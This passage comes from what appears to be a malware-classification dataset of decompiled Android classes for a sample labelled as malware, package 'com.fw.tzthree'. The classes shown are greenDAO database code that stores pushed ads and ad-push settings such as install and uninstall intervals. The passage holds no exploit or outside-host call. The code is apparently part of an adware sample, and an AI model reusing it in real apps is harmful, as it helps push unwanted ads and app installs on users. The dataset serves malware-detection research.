Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");   public static final Property FullScreenImg=new Property(18,String.class,""fullScreenImg"",false,""FULL_SCREEN_IMG""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property HasBoundAd=new Property(17,Integer.class,""hasBoundAd"",false,""HAS_BOUND_AD"");   public static final Property IsRecommend=new Property(18,Integer.class,""isRecommend"",false,""IS_RECOMMEND""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property PackageName=new Property(1,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(2,String.class,""appName"",false,""APP_NAME""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property HasBoundAd=new Property(17,Integer.class,""hasBoundAd"",false,""HAS_BOUND_AD""); } public class Properties {   public static final Property AdType=new Property(0,Long.class,""adType"",true,""AD_TYPE"");   public static final Property LastShowTime=new Property(1,Long.class,""lastShowTime"",false,""LAST_SHOW_TIME"");   public static final Property PushCount=new Property(2,Integer.class,""pushCount"",false,""PUSH_COUNT""); } public class Properties {   public static final Property AdType=new Property(0,Long.class,""adType"",true,""AD_TYPE"");   public static final Property ResourcesAddr=new Property(1,String.class,""resourcesAddr"",false,""RESOURCES_ADDR"");   public static final Property PushMaximum=new Property(2,Integer.class,""pushMaximum"",false,""PUSH_MAXIMUM"");   public static final Property PushTimePeriod=new Property(3,String.class,""pushTimePeriod"",false,""PUSH_TIME_PERIOD"");   public static final Property CacheExpires=new Property(4,String.class,""cacheExpires"",false,""CACHE_EXPIRES"");   public static final Property CwMaxInstall=new Property(5,String.class,""cwMaxInstall"",false,""CW_MAX_INSTALL"");   public static final Property InstallInterval=new Property(6,Integer.class,""installInterval"",false,""INSTALL_INTERVAL"");   public static final Property PushMinimumInterval=new Property(7,Integer.class,""pushMinimumInterval"",false,""PUSH_MINIMUM_INTERVAL"");   public static final Property FirstDelayshow=new Property(8,Integer.class,""firstDelayshow"",false,""FIRST_DELAYSHOW"");   public static final Property UninstallInterval=new Property(9,Integer.class,""uninstallInterval"",false,""UNINSTALL_INTERVAL""); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\PushAd.code","public class PushAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private Long expires;   private String g2Switches;   private String g3Switches;   private Integer hasBoundAd;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private String url;   private String wifiSwitches;   public PushAd(){   }   public PushAd(  Long l){     this.id=l;   }   public PushAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.hasBoundAd=num3;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public Integer getHasBoundAd(){     return this.hasBoundAd;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setHasBoundAd(  Integer num){     this.hasBoundAd=num;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\PushAdDao.code","public class PushAdDao extends AbstractDao<PushAd,Long> {   public static final String TABLENAME=""PUSH_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property HasBoundAd=new Property(17,Integer.class,""hasBoundAd"",false,""HAS_BOUND_AD"");   }   public PushAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public PushAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'PUSH_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'HAS_BOUND_AD' INTEGER);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'PUSH_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  PushAd pushAd){     sQLiteStatement.clearBindings();     Long id=pushAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=pushAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (pushAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (pushAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=pushAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=pushAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=pushAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=pushAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=pushAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=pushAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=pushAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=pushAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=pushAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=pushAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=pushAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=pushAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=pushAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (pushAd.getHasBoundAd() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }   }   @Override public Long getKey(  PushAd pushAd){     if (pushAd != null) {       return pushAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public PushAd readEntity(  Cursor cursor,  int i){     return new PushAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));   }   @Override public void readEntity(  Cursor cursor,  PushAd pushAd,  int i){     pushAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     pushAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     pushAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     pushAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     pushAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     pushAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     pushAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     pushAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     pushAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     pushAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     pushAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     pushAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     pushAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     pushAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     pushAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     pushAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     pushAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     pushAd.setHasBoundAd(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  PushAd pushAd,  long j){     pushAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\PushSetting.code","public class PushSetting {   private Long adType;   private Long lastShowTime;   private Integer pushCount;   public PushSetting(){   }   public PushSetting(  Long l){     this.adType=l;   }   public PushSetting(  Long l,  Long l2,  Integer num){     this.adType=l;     this.lastShowTime=l2;     this.pushCount=num;   }   public Long getAdType(){     return this.adType;   }   public Long getLastShowTime(){     return this.lastShowTime;   }   public Integer getPushCount(){     return this.pushCount;   }   public void setAdType(  Long l){     this.adType=l;   }   public void setLastShowTime(  Long l){     this.lastShowTime=l;   }   public void setPushCount(  Integer num){     this.pushCount=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\PushSettingDao.code","public class PushSettingDao extends AbstractDao<PushSetting,Long> {   public static final String TABLENAME=""PUSH_SETTING""; public class Properties {     public static final Property AdType=new Property(0,Long.class,""adType"",true,""AD_TYPE"");     public static final Property LastShowTime=new Property(1,Long.class,""lastShowTime"",false,""LAST_SHOW_TIME"");     public static final Property PushCount=new Property(2,Integer.class,""pushCount"",false,""PUSH_COUNT"");   }   public PushSettingDao(  DaoConfig daoConfig){     super(daoConfig);   }   public PushSettingDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'PUSH_SETTING' ('AD_TYPE' INTEGER PRIMARY KEY ,'LAST_SHOW_TIME' INTEGER,'PUSH_COUNT' INTEGER);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'PUSH_SETTING'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  PushSetting pushSetting){     sQLiteStatement.clearBindings();     Long adType=pushSetting.getAdType();     if (adType != null) {       sQLiteStatement.bindLong(1,adType.longValue());     }     Long lastShowTime=pushSetting.getLastShowTime();     if (lastShowTime != null) {       sQLiteStatement.bindLong(2,lastShowTime.longValue());     }     if (pushSetting.getPushCount() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }   }   @Override public Long getKey(  PushSetting pushSetting){     if (pushSetting != null) {       return pushSetting.getAdType();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public PushSetting readEntity(  Cursor cursor,  int i){     return new PushSetting(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));   }   @Override public void readEntity(  Cursor cursor,  PushSetting pushSetting,  int i){     pushSetting.setAdType(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     pushSetting.setLastShowTime(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     pushSetting.setPushCount(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  PushSetting pushSetting,  long j){     pushSetting.setAdType(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\Setting.code","public class Setting {   private Long adType;   private String cacheExpires;   private String cwMaxInstall;   private Integer firstDelayshow;   private Integer installInterval;   private Integer pushMaximum;   private Integer pushMinimumInterval;   private String pushTimePeriod;   private String resourcesAddr;   private Integer uninstallInterval;   public Setting(){   }   public Setting(  Long l){     this.adType=l;   }   public Setting(  Long l,  String str,  Integer num,  String str2,  String str3,  String str4,  Integer num2,  Integer num3,  Integer num4,  Integer num5){     this.adType=l;     this.resourcesAddr=str;     this.pushMaximum=num;     this.pushTimePeriod=str2;     this.cacheExpires=str3;     this.cwMaxInstall=str4;     this.installInterval=num2;     this.pushMinimumInterval=num3;     this.firstDelayshow=num4;     this.uninstallInterval=num5;   }   public Long getAdType(){     return this.adType;   }   public String getCacheExpires(){     return this.cacheExpires;   }   public String getCwMaxInstall(){     return this.cwMaxInstall;   }   public Integer getFirstDelayshow(){     return this.firstDelayshow;   }   public Integer getInstallInterval(){     return this.installInterval;   }   public Integer getPushMaximum(){     return this.pushMaximum;   }   public Integer getPushMinimumInterval(){     return this.pushMinimumInterval;   }   public String getPushTimePeriod(){     return this.pushTimePeriod;   }   public String getResourcesAddr(){     return this.resourcesAddr;   }   public Integer getUninstallInterval(){     return this.uninstallInterval;   }   public void setAdType(  Long l){     this.adType=l;   }   public void setCacheExpires(  String str){     this.cacheExpires=str;   }   public void setCwMaxInstall(  String str){     this.cwMaxInstall=str;   }   public void setFirstDelayshow(  Integer num){     this.firstDelayshow=num;   }   public void setInstallInterval(  Integer num){     this.installInterval=num;   }   public void setPushMaximum(  Integer num){     this.pushMaximum=num;   }   public void setPushMinimumInterval(  Integer num){     this.pushMinimumInterval=num;   }   public void setPushTimePeriod(  String str){     this.pushTimePeriod=str;   }   public void setResourcesAddr(  String str){     this.resourcesAddr=str;   }   public void setUninstallInterval(  Integer num){     this.uninstallInterval=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\SettingDao.code","public class SettingDao extends AbstractDao<Setting,Long> {   public static final String TABLENAME=""SETTING""; public class Properties {     public static final Property AdType=new Property(0,Long.class,""adType"",true,""AD_TYPE"");     public static final Property ResourcesAddr=new Property(1,String.class,""resourcesAddr"",false,""RESOURCES_ADDR"");     public static final Property PushMaximum=new Property(2,Integer.class,""pushMaximum"",false,""PUSH_MAXIMUM"");     public static final Property PushTimePeriod=new Property(3,String.class,""pushTimePeriod"",false,""PUSH_TIME_PERIOD"");     public static final Property CacheExpires=new Property(4,String.class,""cacheExpires"",false,""CACHE_EXPIRES"");     public static final Property CwMaxInstall=new Property(5,String.class,""cwMaxInstall"",false,""CW_MAX_INSTALL"");     public static final Property InstallInterval=new Property(6,Integer.class,""installInterval"",false,""INSTALL_INTERVAL"");     public static final Property PushMinimumInterval=new Property(7,Integer.class,""pushMinimumInterval"",false,""PUSH_MINIMUM_INTERVAL"");     public static final Property FirstDelayshow=new Property(8,Integer.class,""firstDelayshow"",false,""FIRST_DELAYSHOW"");     public static final Property UninstallInterval=new Property(9,Integer.class,""uninstallInterval"",false,""UNINSTALL_INTERVAL"");   }   public SettingDao(  DaoConfig daoConfig){     super(daoConfig);   }   public SettingDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'SETTING' ('AD_TYPE' INTEGER PRIMARY KEY ,'RESOURCES_ADDR' TEXT,'PUSH_MAXIMUM' INTEGER,'PUSH_TIME_PERIOD' TEXT,'CACHE_EXPIRES' TEXT,'CW_MAX_INSTALL' TEXT,'INSTALL_INTERVAL' INTEGER,'PUSH_MINIMUM_INTERVAL' INTEGER,'FIRST_DELAYSHOW' INTEGER,'UNINSTALL_INTERVAL' INTEGER);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'SETTING'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  Setting setting){     sQLiteStatement.clearBindings();     Long adType=setting.getAdType();     if (adType != null) {       sQLiteStatement.bindLong(1,adType.longValue());     }     String resourcesAddr=setting.getResourcesAddr();     if (resourcesAddr != null) {       sQLiteStatement.bindString(2,resourcesAddr);     }     if (setting.getPushMaximum() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     String pushTimePeriod=setting.getPushTimePeriod();     if (pushTimePeriod != null) {       sQLiteStatement.bindString(4,pushTimePeriod);     }     String cacheExpires=setting.getCacheExpires();     if (cacheExpires != null) {       sQLiteStatement.bindString(5,cacheExpires);     }     String cwMaxInstall=setting.getCwMaxInstall();     if (cwMaxInstall != null) {       sQLiteStatement.bindString(6,cwMaxInstall);     }     if (setting.getInstallInterval() != null) {       sQLiteStatement.bindLong(7,r0.intValue());     }     if (setting.getPushMinimumInterval() != null) {       sQLiteStatement.bindLong(8,r0.intValue());     }     if (setting.getFirstDelayshow() != null) {       sQLiteStatement.bindLong(9,r0.intValue());     }     if (setting.getUninstallInterval() != null) {       sQLiteStatement.bindLong(10,r0.intValue());     }   }   @Override public Long getKey(  Setting setting){     if (setting != null) {       return setting.getAdType();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public Setting readEntity(  Cursor cursor,  int i){     return new Setting(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : cursor.getString(i + 1),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : cursor.getString(i + 3),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : Integer.valueOf(cursor.getInt(i + 6)),cursor.isNull(i + 7) ? null : Integer.valueOf(cursor.getInt(i + 7)),cursor.isNull(i + 8) ? null : Integer.valueOf(cursor.getInt(i + 8)),cursor.isNull(i + 9) ? null : Integer.valueOf(cursor.getInt(i + 9)));   }   @Override public void readEntity(  Cursor cursor,  Setting setting,  int i){     setting.setAdType(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     setting.setResourcesAddr(cursor.isNull(i + 1) ? null : cursor.getString(i + 1));     setting.setPushMaximum(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     setting.setPushTimePeriod(cursor.isNull(i + 3) ? null : cursor.getString(i + 3));     setting.setCacheExpires(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     setting.setCwMaxInstall(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     setting.setInstallInterval(cursor.isNull(i + 6) ? null : Integer.valueOf(cursor.getInt(i + 6)));     setting.setPushMinimumInterval(cursor.isNull(i + 7) ? null : Integer.valueOf(cursor.getInt(i + 7)));     setting.setFirstDelayshow(cursor.isNull(i + 8) ? null : Integer.valueOf(cursor.getInt(i + 8)));     setting.setUninstallInterval(cursor.isNull(i + 9) ? null : Integer.valueOf(cursor.getInt(i + 9)));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  Setting setting,  long j){     setting.setAdType(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\AbstractDao.code","public abstract class AbstractDao<T,K> {   protected final DaoConfig config;   protected final SQLiteDatabase db;   protected IdentityScope<K,T> identityScope;   protected IdentityScopeLong<T> identityScopeLong;   protected final int pkOrdinal;   protected final AbstractDaoSession session;   protected TableStatements statements;   public AbstractDao(  DaoConfig daoConfig){     this(daoConfig,null);   }   public AbstractDao(  DaoConfig daoConfig,  AbstractDaoSession abstractDaoSession){     this.config=daoConfig;     this.session=abstractDaoSession;     this.db=daoConfig.db;     this.identityScope=(IdentityScope<K,T>)daoConfig.getIdentityScope();     if (this.identityScope instanceof IdentityScopeLong) {       this.identityScopeLong=(IdentityScopeLong)this.identityScope;     }     this.statements=daoConfig.statements;     this.pkOrdinal=daoConfig.pkProperty != null ? daoConfig.pkProperty.ordinal : -1;   }   private void deleteByKeyInsideSynchronized(  K k,  SQLiteStatement sQLiteStatement){     if (k instanceof Long) {       sQLiteStatement.bindLong(1,((Long)k).longValue());     }  else {       if (k == 0) {         throw new DaoException(""Cannot delete entity, key is null"");       }       sQLiteStatement.bindString(1,k.toString());     }     sQLiteStatement.execute();   }   private void deleteInTxInternal(  Iterable<T> iterable,  Iterable<K> iterable2){     assertSinglePk();     SQLiteStatement deleteStatement=this.statements.getDeleteStatement();     ArrayList arrayList=null;     this.db.beginTransaction();     try { synchronized (deleteStatement) {         if (this.identityScope != null) {           this.identityScope.lock();           arrayList=new ArrayList();         }         if (iterable != null) {           try {             Iterator<T> it=iterable.iterator();             while (it.hasNext()) {               K keyVerified=getKeyVerified(it.next());               deleteByKeyInsideSynchronized(keyVerified,deleteStatement);               if (arrayList != null) {                 arrayList.add(keyVerified);               }             }           }   finally {             if (this.identityScope != null) {               this.identityScope.unlock();             }           }         }         if (iterable2 != null) {           for (          K k : iterable2) {             deleteByKeyInsideSynchronized(k,deleteStatement);             if (arrayList != null) {               arrayList.add(k);             }           }         }       }       this.db.setTransactionSuccessful();       if (arrayList != null && this.identityScope != null) {         this.identityScope.remove((Iterable)arrayList);       }     }   finally {       this.db.endTransaction();     }   }   private long executeInsert(  T t,  SQLiteStatement sQLiteStatement){     long 